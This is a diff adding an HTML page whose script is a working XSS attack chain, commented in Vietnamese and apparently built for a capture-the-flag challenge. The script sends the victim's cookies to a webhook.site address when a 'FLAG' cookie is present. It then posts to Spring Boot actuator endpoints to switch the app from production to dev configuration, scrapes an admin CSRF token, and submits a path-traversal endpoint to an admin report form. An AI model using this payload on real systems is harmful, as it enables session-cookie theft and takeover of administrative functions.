@@ -1,0 +1,57 @@
+<html>
+<body>
+  <script>
+    (async function() {
+      try {
+        // 1. Lấy endpoint là pathname của URL hiện tại
+        const currentEndpoint = window.location.pathname;
+
+        if (document.cookie.includes('FLAG')) {
+            // 2. Chỉ gửi cookie ra Webhook và thoát, không làm gì thêm!
+            fetch('https://webhook.site/157a670e-83ac-4bfe-a607-1f6cca30f938/?flag=' + document.cookie);
+            return; 
+        }
+
+        // 3. Gửi 2 POST request sửa env
+        await fetch('/actuator/env', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ "name": "app.enforce-production", "value": "false" })
+        });
+
+        await fetch('/actuator/env', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ "name": "app.active-config", "value": "dev" })
+        });
+
+        // 4. Gửi POST request refresh lại cấu hình
+        await fetch('/actuator/refresh', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' }
+        });
+
+        // 5. Fetch trang /admin và dùng Regex để lấy CSRF token
+        const adminRes = await fetch('/admin');
+        const adminHtml = await adminRes.text();
+        
+        const csrfMatch = adminHtml.match(/name="_csrf" value="(.*?)"/);
+        
+        if (csrfMatch && csrfMatch[1]) {
+          const csrfToken = csrfMatch[1];
+          const bypassEndpoint = '/api/..' +currentEndpoint
+          // 6. Gửi POST request tới /admin/report kèm CSRF token và endpoint
+          await fetch('/admin/report', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'endpoint=' + encodeURIComponent(bypassEndpoint) + '&_csrf=' + encodeURIComponent(csrfToken)
+          });
+        }
+      } catch (err) {
+        console.error("Lỗi kịch bản XSS: ", err);
+      }
+    })();
+  </script>
+</body>
+</html>
+```
